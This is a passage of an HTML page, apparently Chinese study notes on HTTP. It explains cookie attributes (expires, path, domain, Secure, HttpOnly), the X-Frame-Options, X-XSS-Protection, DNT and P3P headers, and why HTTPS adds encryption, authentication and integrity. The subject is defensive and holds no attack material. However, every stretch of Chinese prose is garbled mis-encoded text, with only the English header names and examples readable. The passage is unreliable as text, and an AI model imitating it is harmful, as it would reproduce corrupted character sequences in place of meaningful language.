æœåŠ¡çš„é¦–éƒ¨å­—æ®µ</h4><table><thead><tr><th>é¦–éƒ¨å­—æ®µå</th><th>è¯´æ˜</th><th>é¦–éƒ¨ç±»å‹</th></tr></thead><tbody><tr><td>Set-Cookie</td><td>å¼€å§‹çŠ¶æ€ç®¡ç†æ‰€ä½¿ç”¨çš„Cookieä¿¡æ¯</td><td>å“åº”é¦–éƒ¨å­—æ®µ</td></tr><tr><td>Cookie</td><td>æœåŠ¡å™¨æ¥æ”¶åˆ°çš„Cookieä¿¡æ¯</td><td>è¯·æ±‚é¦–éƒ¨å­—æ®µ</td></tr></tbody></table><h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">status=enable; expires=Tue, 05 Jul 2011 07:26:31</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Set-Cookie</strong> å­—æ®µçš„å±æ€§</p><table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NAME=VALUE</td><td>èµ‹äºˆ Cookie çš„åç§°å’Œå…¶å€¼ï¼ˆå¿…éœ€é¡¹ï¼‰</td></tr><tr><td>expires=DATE</td><td>Cookie çš„æœ‰æ•ˆæœŸï¼ˆè‹¥ä¸æ˜ç¡®æŒ‡å®šåˆ™é»˜è®¤ä¸ºæµè§ˆå™¨å…³é—­å‰ä¸ºæ­¢ï¼‰</td></tr><tr><td>path=PATH</td><td>å°†æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç›®å½•ä½œä¸ºCookieçš„é€‚ç”¨å¯¹è±¡ï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºæ–‡æ¡£æ‰€åœ¨çš„æ–‡ä»¶ç›®å½•ï¼‰</td></tr><tr><td>domain=åŸŸå</td><td>ä½œä¸º Cookie é€‚ç”¨å¯¹è±¡çš„åŸŸå  ï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºåˆ›å»º Cookie  çš„æœåŠ¡å™¨çš„åŸŸåï¼‰</td></tr><tr><td>Secure</td><td>ä»…åœ¨ HTTPS å®‰å…¨é€šä¿¡æ—¶æ‰ä¼šå‘é€  Cookie</td></tr><tr><td>HttpOnly</td><td>åŠ ä»¥é™åˆ¶ï¼Œä½¿ Cookie ä¸èƒ½è¢« JavaScript è„šæœ¬è®¿é—®</td></tr></tbody></table><h6 id="expires-å±æ€§"><a href="#expires-å±æ€§" class="headerlink" title="expires å±æ€§"></a>expires å±æ€§</h6><p>Cookie çš„ expires å±æ€§æŒ‡å®šæµè§ˆå™¨å¯å‘é€ Cookie çš„æœ‰æ•ˆæœŸã€‚</p><p>å½“çœç•¥ expires å±æ€§æ—¶ï¼Œå…¶æœ‰æ•ˆæœŸä»…é™äºç»´æŒæµè§ˆå™¨ä¼šè¯ï¼ˆSessionï¼‰ æ—¶é—´æ®µå†…ã€‚è¿™é€šå¸¸é™äºæµè§ˆå™¨åº”ç”¨ç¨‹åºè¢«å…³é—­ä¹‹å‰ã€‚</p><p>å¦å¤–ï¼Œä¸€æ—¦ Cookie ä»æœåŠ¡å™¨ç«¯å‘é€è‡³å®¢æˆ·ç«¯ï¼ŒæœåŠ¡å™¨ç«¯å°±ä¸å­˜åœ¨å¯ä»¥æ˜¾å¼åˆ é™¤ Cookie çš„æ–¹æ³•ã€‚ä½†å¯é€šè¿‡è¦†ç›–å·²è¿‡æœŸçš„ Cookieï¼Œå®ç°å¯¹å®¢æˆ·ç«¯ Cookie çš„å®è´¨æ€§åˆ é™¤æ“ä½œã€‚</p><h5 id="path-å±æ€§"><a href="#path-å±æ€§" class="headerlink" title="path å±æ€§"></a><strong>path</strong> å±æ€§</h5><p>Cookie çš„ path å±æ€§å¯ç”¨äºé™åˆ¶æŒ‡å®š Cookie çš„å‘é€èŒƒå›´çš„æ–‡ä»¶ç›®å½•ã€‚ä¸è¿‡å¦æœ‰åŠæ³•å¯é¿å¼€è¿™é¡¹é™åˆ¶ï¼Œçœ‹æ¥å¯¹å…¶ä½œä¸ºå®‰å…¨æœºåˆ¶çš„æ•ˆæœä¸èƒ½æŠ±æœ‰æœŸå¾…ã€‚</p><h5 id="domain-å±æ€§"><a href="#domain-å±æ€§" class="headerlink" title="domain å±æ€§"></a><strong>domain</strong> å±æ€§</h5><p>é€šè¿‡ Cookie çš„ domain å±æ€§æŒ‡å®šçš„åŸŸåå¯åšåˆ°ä¸ç»“å°¾åŒ¹é…ä¸€è‡´ã€‚æ¯”å¦‚ï¼Œå½“æŒ‡å®š example.com åï¼Œé™¤ example.com ä»¥å¤–ï¼Œ<a href="http://www.example.com/">www.example.com </a>æˆ–www2.example.com ç­‰éƒ½å¯ä»¥å‘é€ Cookieã€‚</p><p>å› æ­¤ï¼Œé™¤äº†é’ˆå¯¹å…·ä½“æŒ‡å®šçš„å¤šä¸ªåŸŸåå‘é€ Cookie ä¹‹ å¤–ï¼Œä¸æŒ‡å®šdomain å±æ€§æ˜¾å¾—æ›´å®‰å…¨</p><h5 id="secure-å±æ€§"><a href="#secure-å±æ€§" class="headerlink" title="secure å±æ€§"></a><strong>secure</strong> å±æ€§</h5><p>Cookie çš„ secure å±æ€§ç”¨äºé™åˆ¶ Web é¡µé¢ä»…åœ¨ HTTPS å®‰å…¨è¿æ¥æ—¶ï¼Œæ‰å¯ä»¥å‘é€ Cookieã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">name=value; secure</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="HttpOnly-å±æ€§"><a href="#HttpOnly-å±æ€§" class="headerlink" title="HttpOnly å±æ€§"></a>HttpOnly å±æ€§</h6><p>Cookie çš„ HttpOnly å±æ€§æ˜¯ Cookie çš„æ‰©å±•åŠŸèƒ½ï¼Œå®ƒä½¿ JavaScript è„šæœ¬æ— æ³•è·å¾— Cookieã€‚å…¶ä¸»è¦ç›®çš„ä¸ºé˜²æ­¢è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-site scriptingï¼ŒXSSï¼‰å¯¹ Cookie çš„ä¿¡æ¯çªƒå–ã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">name=value; HttpOnly</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">status=enable</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Cookie ä¼šå‘ŠçŸ¥æœåŠ¡å™¨ï¼Œå½“å®¢æˆ·ç«¯æƒ³è·å¾— HTTP çŠ¶æ€ç®¡ç†æ”¯æŒæ—¶ï¼Œå°±ä¼šåœ¨è¯·æ±‚ä¸­åŒ…å«ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ Cookieã€‚æ¥æ”¶åˆ°å¤šä¸ªCookie æ—¶ï¼ŒåŒæ ·å¯ä»¥ä»¥å¤šä¸ª Cookie å½¢å¼å‘é€ã€‚</p><h3 id="å…¶ä»–é¦–éƒ¨å­—æ®µ"><a href="#å…¶ä»–é¦–éƒ¨å­—æ®µ" class="headerlink" title="å…¶ä»–é¦–éƒ¨å­—æ®µ"></a>å…¶ä»–é¦–éƒ¨å­—æ®µ</h3><p>HTTP é¦–éƒ¨å­—æ®µæ˜¯å¯ä»¥è‡ªè¡Œæ‰©å±•çš„ã€‚</p><table><thead><tr><th>X-Frame-Options</th></tr></thead><tbody><tr><td>X-XSS-Protection</td></tr><tr><td>DNT</td></tr><tr><td>P3P</td></tr></tbody></table><h4 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Frame-Options</span><span class="token punctuation">:</span> <span class="token header-value">DENY</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ X-Frame-Options å±äº HTTP å“åº”é¦–éƒ¨ï¼Œç”¨äºæ§åˆ¶ç½‘ç«™å†…å®¹åœ¨å…¶ä»– Web ç½‘ç«™çš„ Frame æ ‡ç­¾å†…çš„æ˜¾ç¤ºé—®é¢˜ã€‚å…¶ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼ˆclickjackingï¼‰æ”»å‡»ã€‚</p><h5 id="å­—æ®µ"><a href="#å­—æ®µ" class="headerlink" title="å­—æ®µ"></a>å­—æ®µ</h5><ul><li><strong>DENY</strong> ï¼šæ‹’ç»</li><li><strong>SAMEORIGIN</strong> ï¼šä»…åŒæºåŸŸåä¸‹çš„é¡µé¢ï¼ˆTop-level-browsing- contextï¼‰åŒ¹é…æ—¶è®¸å¯ã€‚ï¼ˆæ¯”å¦‚ï¼Œå½“æŒ‡å®š <a href="http://hackr.jp/sample.html">http://hackr.jp/sample.html </a>é¡µé¢ä¸º SAMEORIGIN æ—¶ï¼Œé‚£ä¹ˆ hackr.jp ä¸Šæ‰€æœ‰é¡µé¢çš„ frame éƒ½è¢«å…è®¸å¯åŠ è½½è¯¥é¡µé¢ï¼Œè€Œ example.com ç­‰å…¶ä»–åŸŸåçš„é¡µé¢å°±ä¸è¡Œäº†ï¼‰</li></ul><h5 id="apache2-conf-çš„é…ç½®å®ä¾‹"><a href="#apache2-conf-çš„é…ç½®å®ä¾‹" class="headerlink" title="apache2.conf çš„é…ç½®å®ä¾‹"></a><strong>apache2.conf</strong> çš„é…ç½®å®ä¾‹</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http">&lt;IfModule mod_headers.c&gt;Header append X-FRAME-OPTIONS "SAMEORIGIN"&lt;/IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-XSS-Protection</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ X-XSS-Protection å±äº HTTP å“åº”é¦–éƒ¨ï¼Œå®ƒæ˜¯é’ˆå¯¹è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰çš„ä¸€ç§å¯¹ç­–ï¼Œç”¨äºæ§åˆ¶æµè§ˆå™¨ XSS é˜²æŠ¤æœºåˆ¶çš„å¼€å…³ã€‚</p><ul><li>0ï¼šå°† XSS è¿‡æ»¤è®¾ç½®æˆæ— æ•ˆçŠ¶æ€</li><li>1ï¼šå°† XSS è¿‡æ»¤è®¾ç½®æˆæœ‰æ•ˆçŠ¶æ€</li></ul><h4 id="DNT"><a href="#DNT" class="headerlink" title="DNT"></a>DNT</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ DNT å±äº HTTP è¯·æ±‚é¦–éƒ¨ï¼Œå…¶ä¸­ DNT æ˜¯ Do Not Track çš„ç®€ç§°ï¼Œæ„ä¸ºæ‹’ç»ä¸ªäººä¿¡æ¯è¢«æ”¶é›†ï¼Œæ˜¯è¡¨ç¤ºæ‹’ç»è¢«ç²¾å‡†å¹¿å‘Šè¿½è¸ªçš„ä¸€ç§æ–¹æ³•ã€‚</p><ul><li>0ï¼šåŒæ„è¢«è¿½è¸ª</li><li>1ï¼šæ‹’ç»è¢«è¿½è¸ª</li></ul><h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">P3P</span><span class="token punctuation">:</span> <span class="token header-value">CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ P3P å±äº HTTP ç›¸åº”é¦–éƒ¨ï¼Œé€šè¿‡åˆ©ç”¨ P3Pï¼ˆThe Platform for Privacy Preferencesï¼Œåœ¨çº¿éšç§åå¥½å¹³å°ï¼‰æŠ€æœ¯ï¼Œå¯ä»¥è®© Web ç½‘ç«™ä¸Šçš„ä¸ªäººéšç§å˜æˆä¸€ç§ä»…ä¾›ç¨‹åºå¯ç†è§£çš„å½¢å¼ï¼Œä»¥è¾¾åˆ°ä¿æŠ¤ç”¨æˆ·éšç§çš„ç›®çš„ã€‚</p><p>è¦è¿›è¡Œ P3P çš„è®¾å®šï¼Œéœ€æŒ‰ä»¥ä¸‹æ“ä½œæ­¥éª¤è¿›è¡Œã€‚</p><p>æ­¥éª¤ <strong>1</strong>ï¼šåˆ›å»º P3P éšç§</p><p>æ­¥éª¤ <strong>2</strong>ï¼šåˆ›å»º P3P éšç§å¯¹ç…§æ–‡ä»¶åï¼Œä¿å­˜å‘½ååœ¨ /w3c/p3p.xml</p><p>æ­¥éª¤ <strong>3</strong>ï¼šä» P3P éšç§ä¸­æ–°å»º Compact policies åï¼Œè¾“å‡ºåˆ° HTTP å“åº”ä¸­</p><h2 id="ç¡®ä¿-Web-å®‰å…¨çš„HTTPS"><a href="#ç¡®ä¿-Web-å®‰å…¨çš„HTTPS" class="headerlink" title="ç¡®ä¿ Web å®‰å…¨çš„HTTPS"></a>ç¡®ä¿ <strong>Web</strong> å®‰å…¨çš„HTTPS</h2><p>åœ¨ HTTP åè®®ä¸­æœ‰å¯èƒ½å­˜åœ¨ä¿¡æ¯çªƒå¬æˆ–èº«ä»½ä¼ªè£…ç­‰å®‰å…¨é—®é¢˜ã€‚ä½¿ç”¨HTTPS é€šä¿¡æœºåˆ¶å¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢è¿™äº›é—®é¢˜ã€‚</p><h3 id="HTTPçš„ç¼ºç‚¹"><a href="#HTTPçš„ç¼ºç‚¹" class="headerlink" title="HTTPçš„ç¼ºç‚¹"></a>HTTPçš„ç¼ºç‚¹</h3><ul><li><p>é€šä¿¡ä½¿ç”¨æ˜æ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬</p></li><li><p>ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œå› æ­¤æœ‰å¯èƒ½é­é‡ä¼ªè£…</p></li><li><p>æ— æ³•è¯æ˜æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œæ‰€ä»¥æœ‰å¯èƒ½å·²é­ç¯¡æ”¹</p></li></ul><h4 id="é€šä¿¡ä½¿ç”¨æ˜æ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬"><a href="#é€šä¿¡ä½¿ç”¨æ˜æ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬" class="headerlink" title="é€šä¿¡ä½¿ç”¨æ˜æ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬"></a>é€šä¿¡ä½¿ç”¨æ˜æ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬</h4><p>ç”±äº HTTP æœ¬èº«ä¸å…·å¤‡åŠ å¯†çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•åšåˆ°å¯¹é€šä¿¡æ•´ä½“ï¼ˆä½¿ç”¨ HTTP åè®®é€šä¿¡çš„è¯·æ±‚å’Œå“åº”çš„å†…å®¹ï¼‰è¿›è¡ŒåŠ å¯†ã€‚å³ï¼ŒHTTP æŠ¥æ–‡ä½¿ç”¨æ˜æ–‡ï¼ˆæŒ‡æœªç»è¿‡åŠ å¯†çš„æŠ¥æ–‡ï¼‰æ–¹å¼å‘é€ã€‚</p><ul><li><p><strong>TCP/IP</strong> æ˜¯å¯èƒ½è¢«çªƒå¬çš„ç½‘ç»œ</p><p>äº’è”ç½‘ä¸Šçš„ä»»ä½•è§’è½éƒ½å­˜åœ¨é€šä¿¡å†…å®¹è¢«çªƒå¬çš„é£é™©</p><p>å³ä½¿åŠ å¯†çš„å¤„ç†è¿‡çš„é€šä¿¡ä»»ä¼šè¢«ç›‘å¬ï¼Œåªæ˜¯ç›‘å¬è€…è¿˜éœ€è¦ç ´è§£æŠ¥æ–‡ä¿¡æ¯</p></li><li><p>åŠ å¯†å¤„ç†é˜²æ­¢è¢«çªƒå¬</p><ul><li><p>é€šä¿¡çš„åŠ å¯†</p><p>HTTP åè®®ä¸­æ²¡æœ‰åŠ å¯†æœºåˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡å’Œ SSLï¼ˆSecure Socket Layerï¼Œå®‰å…¨å¥—æ¥å±‚ï¼‰æˆ–TLSï¼ˆTransport Layer Securityï¼Œå®‰å…¨å±‚ä¼ è¾“åè®®ï¼‰çš„ç»„åˆä½¿ç”¨ï¼Œ åŠ å¯† HTTP çš„é€šä¿¡å†…å®¹ã€‚</p></li><li><p>å†…å®¹çš„åŠ å¯†</p><p>HTTP åè®®ä¸­æ²¡æœ‰åŠ å¯†æœºåˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡å’Œ SSLï¼ˆSecure Socket Layerï¼Œå®‰å…¨å¥—æ¥å±‚ï¼‰æˆ–TLSï¼ˆTransport Layer Securityï¼Œå®‰å…¨å±‚ä¼ è¾“åè®®ï¼‰çš„ç»„åˆä½¿ç”¨ï¼Œ åŠ å¯† HTTP çš„é€šä¿¡å†…å®¹ã€‚</p><p>æŠŠHTTP æŠ¥æ–‡é‡Œæ‰€å«çš„å†…å®¹è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚</p></li></ul></li></ul><p><img src="https://z3.ax1x.com/2021/04/22/cqyQpQ.png" alt="cqyQpQ.png"></p><h4 id="ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½å°±å¯èƒ½é­é‡ä¼ªè£…"><a href="#ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½å°±å¯èƒ½é­é‡ä¼ªè£…" class="headerlink" title="ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½å°±å¯èƒ½é­é‡ä¼ªè£…"></a>ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½å°±å¯èƒ½é­é‡ä¼ªè£…</h4><p>HTTP åè®®ä¸­çš„è¯·æ±‚å’Œå“åº”ä¸ä¼šå¯¹é€šä¿¡æ–¹è¿›è¡Œç¡®è®¤ã€‚ä¹Ÿå°±æ˜¯è¯´å­˜åœ¨â€œæœåŠ¡å™¨æ˜¯å¦å°±æ˜¯å‘é€è¯·æ±‚ä¸­ URI çœŸæ­£æŒ‡å®šçš„ä¸»æœºï¼Œè¿”å›çš„å“åº”æ˜¯å¦çœŸçš„è¿”å›åˆ°å®é™…æå‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯â€ç­‰ç±»ä¼¼é—®é¢˜ã€‚</p><h5 id="ä»»ä½•äººéƒ½å¯å‘èµ·è¯·æ±‚"><a href="#ä»»ä½•äººéƒ½å¯å‘èµ·è¯·æ±‚" class="headerlink" title="ä»»ä½•äººéƒ½å¯å‘èµ·è¯·æ±‚"></a>ä»»ä½•äººéƒ½å¯å‘èµ·è¯·æ±‚</h5><p>HTTP åè®®çš„å®ç°æœ¬èº«éå¸¸ç®€å•ï¼Œä¸è®ºæ˜¯è°å‘é€è¿‡æ¥çš„è¯·æ±‚éƒ½ä¼šè¿”å›å“åº”ã€‚</p><ul><li>æ— æ³•åˆ¤æ–­å‘å‡ºçš„è¯·æ±‚æ˜¯å¦åˆ°è¾¾ç†æƒ³æœåŠ¡å™¨ï¼Œä¼ªè£…æœåŠ¡å™¨</li><li>æ— æ³•åˆ¤æ–­å“åº”æ˜¯ç†æƒ³å®¢æœç«¯å‘æ¥çš„ï¼Œä¼ªé€ å®¢æœç«¯</li><li>æ— æ³•åˆ¤æ–­å¯¹æ–¹æ˜¯å¦å…·æœ‰è®¿é—®æƒé™</li><li>æ— æ³•åˆ¤æ–­æ˜¯å¦ä¼šå‘ç»™ç†æƒ³å®¢æˆ·ç«¯</li></ul><h5 id="æŸ¥æ˜å¯¹æ‰‹çš„è¯ä¹¦"><a href="#æŸ¥æ˜å¯¹æ‰‹çš„è¯ä¹¦" class="headerlink" title="æŸ¥æ˜å¯¹æ‰‹çš„è¯ä¹¦"></a>æŸ¥æ˜å¯¹æ‰‹çš„è¯ä¹¦</h5><p>è™½ç„¶ä½¿ç”¨ HTTP åè®®æ— æ³•ç¡®å®šé€šä¿¡æ–¹ï¼Œä½†å¦‚æœä½¿ç”¨ SSL åˆ™å¯ä»¥ã€‚SSL ä¸ä»…æä¾›åŠ å¯†å¤„ç†ï¼Œè€Œä¸”è¿˜ä½¿ç”¨äº†ä¸€ç§è¢«ç§°ä¸ºè¯ä¹¦çš„æ‰‹æ®µï¼Œ å¯ç”¨äºç¡®å®šæ–¹ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/22/cqy16s.png" alt="cqy16s.png"></p><h4 id="æ— æ³•è¯æ˜æŠ¥æ–‡å®Œæ•´æ€§ï¼Œå¯èƒ½å·²é­ç¯¡æ”¹"><a href="#æ— æ³•è¯æ˜æŠ¥æ–‡å®Œæ•´æ€§ï¼Œå¯èƒ½å·²é­ç¯¡æ”¹" class="headerlink" title="æ— æ³•è¯æ˜æŠ¥æ–‡å®Œæ•´æ€§ï¼Œå¯èƒ½å·²é­ç¯¡æ”¹"></a>æ— æ³•è¯æ˜æŠ¥æ–‡å®Œæ•´æ€§ï¼Œå¯èƒ½å·²é­ç¯¡æ”¹</h4><p>æ‰€è°“å®Œæ•´æ€§æ˜¯æŒ‡ä¿¡æ¯çš„å‡†ç¡®åº¦ã€‚</p><h5 id="æ¥æ”¶åˆ°çš„å†…å®¹å¯èƒ½æœ‰è¯¯"><a href="#æ¥æ”¶åˆ°çš„å†…å®¹å¯èƒ½æœ‰è¯¯" class="headerlink" title="æ¥æ”¶åˆ°çš„å†…å®¹å¯èƒ½æœ‰è¯¯"></a>æ¥æ”¶åˆ°çš„å†…å®¹å¯èƒ½æœ‰è¯¯</h5><p>åœ¨è¯·æ±‚æˆ–å“åº”é€å‡ºä¹‹åç›´åˆ°å¯¹æ–¹æ¥æ”¶ä¹‹å‰çš„è¿™æ®µæ—¶é—´å†…ï¼Œå³ä½¿è¯·æ±‚æˆ–å“åº”çš„å†…å®¹é­åˆ°ç¯¡æ”¹ï¼Œä¹Ÿæ²¡æœ‰åŠæ³•è·æ‚‰ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/22/cqy3Xn.png" alt="cqy3Xn.png"></p><h5 id="å¦‚ä½•é˜²æ­¢ç¯¡æ”¹"><a href="#å¦‚ä½•é˜²æ­¢ç¯¡æ”¹" class="headerlink" title="å¦‚ä½•é˜²æ­¢ç¯¡æ”¹"></a>å¦‚ä½•é˜²æ­¢ç¯¡æ”¹</h5><p>å…¶ä¸­å¸¸ç”¨çš„æ˜¯ MD5 å’Œ SHA-1 ç­‰æ•£åˆ—å€¼æ ¡éªŒçš„æ–¹æ³•ï¼Œ ä»¥åŠç”¨æ¥ç¡®è®¤æ–‡ä»¶çš„æ•°å­—ç­¾åæ–¹æ³•ã€‚è¿™äº›ç®—æ³•ä¹Ÿä¼šè¢«æ”¹å†™ã€‚</p><h3 id="HTTP-åŠ å¯†-è®¤è¯-å®Œæ•´æ€§ä¿æŠ¤-HTTPS"><a href="#HTTP-åŠ å¯†-è®¤è¯-å®Œæ•´æ€§ä¿æŠ¤-HTTPS" class="headerlink" title="HTTP+ åŠ å¯† + è®¤è¯ + å®Œæ•´æ€§ä¿æŠ¤**=HTTPS**"></a><strong>HTTP+</strong> åŠ å¯† <strong>+</strong> è®¤è¯ <strong>+</strong> å®Œæ•´æ€§ä¿æŠ¤**=HTTPS**</h3><h4 id="HTTP-åŠ ä¸ŠåŠ å¯†å¤„ç†å’Œè®¤è¯ä»¥åŠå®Œæ•´æ€§ä¿æŠ¤åå³æ˜¯HTTPS"><a href="#HTTP-åŠ ä¸ŠåŠ å¯†å¤„ç†å’Œè®¤è¯ä»¥åŠå®Œæ•´æ€§ä¿æŠ¤åå³æ˜¯HTTPS" class="headerlink" title="HTTP åŠ ä¸ŠåŠ å¯†å¤„ç†å’Œè®¤è¯ä»¥åŠå®Œæ•´æ€§ä¿æŠ¤åå³æ˜¯HTTPS"></a><strong>HTTP</strong> åŠ ä¸ŠåŠ å¯†å¤„ç†å’Œè®¤è¯ä»¥åŠå®Œæ•´æ€§ä¿æŠ¤åå³æ˜¯HTTPS</h4><p>æŠŠæ·»åŠ äº†åŠ å¯†åŠè®¤è¯æœºåˆ¶çš„ HTTP ç§°ä¸º HTTPSï¼ˆHTTP Secureï¼‰ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/22/cqyJ00.png" alt="cqyJ00.png"></p><h4 id="HTTPS-æ˜¯èº«æŠ«-SSL-å¤–å£³çš„-HTTP"><a href="#HTTPS-æ˜¯èº«æŠ«-SSL-å¤–å£³çš„-HTTP" class="headerlink" title="HTTPS æ˜¯èº«æŠ« SSL å¤–å£³çš„ HTTP"></a><strong>HTTPS</strong> æ˜¯èº«æŠ« <strong>SSL</strong> å¤–å£³çš„ <strong>HTTP</strong></h4><p><img src="https://z3.ax1x.com/2021/04/22/cqyY7V.png" alt="cqyY7V.png"></p><h4 id="ç›¸äº’äº¤æ¢å¯†é’¥çš„å…¬å¼€å¯†é’¥åŠ å¯†æŠ€æœ¯"><a href="#ç›¸äº’äº¤æ¢å¯†é’¥çš„å…¬å¼€å¯†é’¥åŠ å¯†æŠ€æœ¯" class="headerlink" title="ç›¸äº’äº¤æ¢å¯†é’¥çš„å…¬å¼€å¯†é’¥åŠ å¯†æŠ€æœ¯"></a>ç›¸äº’äº¤æ¢å¯†é’¥çš„å…¬å¼€å¯†é’¥åŠ å¯†æŠ€æœ¯</h4><p>SSL é‡‡ç”¨ä¸€ç§å«åšå…¬å¼€å¯†é’¥åŠ å¯†ï¼ˆPublic-key cryptographyï¼‰çš„åŠ å¯†å¤„ç†æ–¹å¼ã€‚</p><ul><li>å…±äº«å¯†é’¥åŠ å¯†çš„å›°å¢ƒ</li><li>ä½¿ç”¨ä¸¤æŠŠå¯†é’¥çš„å…¬å¼€å¯†é’¥åŠ å¯†</li><li><strong>HTTPS</strong> é‡‡ç”¨æ··åˆåŠ å¯†æœºåˆ¶</li></ul><h4 id="è¯æ˜å…¬å¼€å¯†é’¥æ­£ç¡®æ€§çš„è¯ä¹¦"><a href="#è¯æ˜å…¬å¼€å¯†é’¥æ­£ç¡®æ€§çš„è¯ä¹¦" class="headerlink" title="è¯æ˜å…¬å¼€å¯†é’¥æ­£ç¡®æ€§çš„è¯ä¹¦"></a>è¯æ˜å…¬å¼€å¯†é’¥æ­£ç¡®æ€§çš„è¯ä¹¦</h4><p><img src="https://z3.ax1x.com/2021/04/22/cqyUtU.png" alt="cqyUtU.png"></p><ul><li><p>å¯è¯æ˜ç»„ç»‡çœŸå®æ€§çš„ <strong>EV SSL</strong> è¯ä¹¦</p><p>è¯ä¹¦çš„ä¸€ä¸ªä½œç”¨æ˜¯ç”¨æ¥è¯æ˜ä½œä¸ºé€šä¿¡ä¸€æ–¹çš„æœåŠ¡å™¨æ˜¯å¦è§„èŒƒï¼Œå¦å¤–ä¸€ä¸ªä½œç”¨æ˜¯å¯ç¡®è®¤å¯¹æ–¹æœåŠ¡å™¨èƒŒåè¿è¥çš„ä¼ä¸šæ˜¯å¦çœŸå®å­˜åœ¨ã€‚æ‹¥æœ‰è¯¥ç‰¹æ€§çš„è¯ä¹¦å°±æ˜¯ EV SSL è¯ä¹¦ï¼ˆExtended Validation SSL Certificateï¼‰ã€‚</p></li><li><p>ç”¨ä»¥ç¡®è®¤å®¢æˆ·ç«¯çš„å®¢æˆ·ç«¯è¯ä¹¦</p><p>HTTPS ä¸­è¿˜å¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯è¯ä¹¦ã€‚ä»¥å®¢æˆ·ç«¯è¯ä¹¦è¿›è¡Œå®¢æˆ·ç«¯è®¤è¯ï¼Œè¯æ˜æœåŠ¡å™¨æ­£åœ¨é€šä¿¡çš„å¯¹æ–¹å§‹ç»ˆæ˜¯é¢„æ–™ä¹‹å†…çš„å®¢æˆ·ç«¯ï¼Œå…¶ä½œç”¨è·ŸæœåŠ¡å™¨è¯ä¹¦å¦‚å‡ºä¸€è¾™ã€‚</p></li><li><p>è®¤è¯æœºæ„ä¿¡èª‰ç¬¬ä¸€</p></li><li><p>ç”±è‡ªè®¤è¯æœºæ„é¢å‘çš„è¯ä¹¦ç§°ä¸ºè‡ªç­¾åè¯ä¹¦</p></li></ul><h4 